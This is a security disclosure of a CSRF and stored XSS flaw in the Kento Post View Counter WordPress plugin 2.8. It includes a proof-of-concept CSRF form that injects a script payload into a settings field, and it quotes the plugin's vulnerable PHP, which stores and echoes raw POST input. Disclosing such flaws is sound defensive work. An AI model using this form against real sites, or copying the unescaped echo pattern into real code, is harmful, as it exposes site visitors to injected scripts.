@@ -1,0 +1,133 @@
+I would like to disclose  CSRF and stored XSS vulnerability in Kento post view counter plugin version 2.8 .
+
+The vulnerable Fields for XSS are 
+
+    kento_pvc_numbers_lang
+    kento_pvc_today_text
+    kento_pvc_total_text
+
+The combination of CSRF and XSS in this plugin can lead to huge damage of the website, as the two fields kento_pvc_today_text and kento_pvc_total_text are reflected on all authenticated users as well as non-authenticated user ,all the post have a footer which shows this two parameter reflected in them ,so if an attacker successfully attacks a website almost all the pages on that website will execute the malicious javascript payload on all the clients browsers visiting that website.every user visiting the website will be affected.
+
+
+
+
+The plugin can be found at https://wordpress.org/plugins/kento-post-view-counter/
+
+
+This CSRF is tested on latest wordpress installation 4.4.2 using firefox browser.  and chrome.
+
+
+The Code for CSRF.html is 
+
+<html>
+  <body>
+    <form action="http://targetsite/wp-admin/admin.php?page=kentopvc_settings" method="POST">
+      <input type="hidden" name="kentopvc_hidden" value="Y" />
+      <input type="hidden" name="option_page" value="kento_pvc_plugin_options" />
+      <input type="hidden" name="action" value="update" />
+      <input type="hidden" name="_wpnonce" value="" />
+      <input type="hidden" name="_wp_http_referer" value="" />
+      <input type="hidden" name="kento_pvc_posttype[post]" value="1" />
+      <input type="hidden" name="kento_pvc_posttype[page]" value="1" />
+      <input type="hidden" name="kento_pvc_posttype[attachment]" value="1" />
+      <input type="hidden" name="kento_pvc_posttype[revision]" value="1" />
+      <input type="hidden" name="kento_pvc_posttype[nav_menu_item]" value="1" />
+      <input type="hidden" name="kento_pvc_numbers_lang" value="" />
+      <input type="hidden" name="kento_pvc_today_text" value=""<script>alert(1);</script><img src="b" />
+      <input type="hidden" name="kento_pvc_total_text" value="" />
+      <input type="hidden" name="Submit" value="Save Changes" />
+      <input type="submit" value="Submit form" />
+    </form>
+  </body>
+</html>
+
+The Vulnerable page is 
+
+wp-content\plugins\kento-post-view-counter\kento-pvc-admin.php
+
+The code Reponsible for XSS :
+
+if($_POST['kentopvc_hidden'] == 'Y') {
+//Form data sent
+if(empty($_POST['kento_pvc_hide']))
+{
+$kento_pvc_hide ="";
+}
+else
+{
+$kento_pvc_hide = $_POST['kento_pvc_hide'];
+}
+update_option('kento_pvc_hide', $kento_pvc_hide);
+
+
+
+if(empty($_POST['kento_pvc_posttype']))
+{
+$kento_pvc_posttype ="";
+}
+else
+{
+$kento_pvc_posttype = $_POST['kento_pvc_posttype'];
+}
+update_option('kento_pvc_posttype', $kento_pvc_posttype);
+if(empty($_POST['kento_pvc_uniq']))
+{
+$kento_pvc_uniq ="";
+}
+else
+{
+$kento_pvc_uniq = $_POST['kento_pvc_uniq'];
+}
+update_option('kento_pvc_uniq', $kento_pvc_uniq);
+
+
+$kento_pvc_numbers_lang = $_POST['kento_pvc_numbers_lang'];
+update_option('kento_pvc_numbers_lang', $kento_pvc_numbers_lang);
+
+$kento_pvc_today_text = $_POST['kento_pvc_today_text'];
+update_option('kento_pvc_today_text', $kento_pvc_today_text);
+
+$kento_pvc_total_text = $_POST['kento_pvc_total_text'];
+update_option('kento_pvc_total_text', $kento_pvc_total_text);
+
+
+--------------------------snip-----------------------
+------------------snip ------------------------------
+
+
+
+
+<input type="text" size="20" name="kento_pvc_numbers_lang" id="kento-pvc-numbers-lang"   value ="<?php if (isset($kento_pvc_numbers_lang)) echo $kento_pvc_numbers_lang; ?>" placeholder="0,1,2,3,4,5,6,7,8,9"   /><br />**Write numbers in your language as following 0,1,2,3,4,5,6,7,8,9<br />
+   Left blank if you are in English.
+
+
+
+<tr valign="top">
+<th scope="row">Text For Today View</th>
+<td style="vertical-align:middle;">
+
+   <input type="text" size="20" name="kento_pvc_today_text" id="kento-pvc-today-text"   value ="<?php if (isset($kento_pvc_today_text)) echo $kento_pvc_today_text; ?>" placeholder="Views Today "   />
+
+</td>
+</tr>
+
+
+<tr valign="top">
+<th scope="row">Text For Total View</th>
+<td style="vertical-align:middle;">
+
+   <input type="text" size="20" name="kento_pvc_total_text" id="kento-pvc-total-text"   value ="<?php if (isset($kento_pvc_total_text)) echo $kento_pvc_total_text; ?>" placeholder="Total Views "   />
+
+</td>
+</tr>
+
+
+
+No anti-CSRF token used on this form  :
+
+All though the WordPress sends the _wpnonce value but it does not protect this form against CSRF.
+
+
+# Author email: cor3sm4sh3r[at]gmail.com
+# Contact: https://in.linkedin.com/in/cor3sm4sh3r
+# Twitter: https://twitter.com/cor3sm4sh3r
